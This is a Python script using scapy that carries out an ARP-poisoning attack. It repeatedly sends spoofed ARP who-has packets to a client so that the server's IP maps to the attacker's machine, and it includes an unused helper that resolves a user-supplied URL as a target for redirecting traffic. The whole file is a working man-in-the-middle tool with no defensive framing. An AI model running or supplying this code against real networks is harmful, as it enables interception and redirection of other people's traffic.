from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import *
import pcap
import time

# change before running:
local_ip = '10.0.0.14'
client_ip = "10.0.0.12"
server_ip = "10.0.0.138"
# -----------------------

custom_ip = ""


def arp_poison():
    """sends ARP who-has massages every 5 seconds to the target,
     poisoning the ARP cache with (myMac, servers ip)"""
    client_mac = getmacbyip(client_ip)
    print("sending who-has packets to target")
    pkt = Ether(dst=client_mac) / ARP(op="who-has", psrc=server_ip, pdst=client_ip)

    while True:
        sendp(pkt)
        time.sleep(5)


def get_ip_from_url():
    """sends a DNS request to the specified url. returns the matching ip got from the server"""
    try:
        print("custom ip setup")
        custom_url = input("enter url to redirect packets to: ")
        ip = sr1(
            IP(dst="8.8.8.8") / UDP(sport=RandShort(), dport=53)
            / DNS(rd=1, qd=DNSQR(qname=custom_url, qtype="A"))).an.rdata
        print("----------------------------------------\n")
    except AttributeError:
        print("Invalid url. Try again.")
        ip = get_ip_from_url()
    return ip


def main():
    # target_ip = input(enter tragets ip)
    # server_ip = input(enter servers ip)
    arp_poison()


if __name__ == "__main__":
    main()
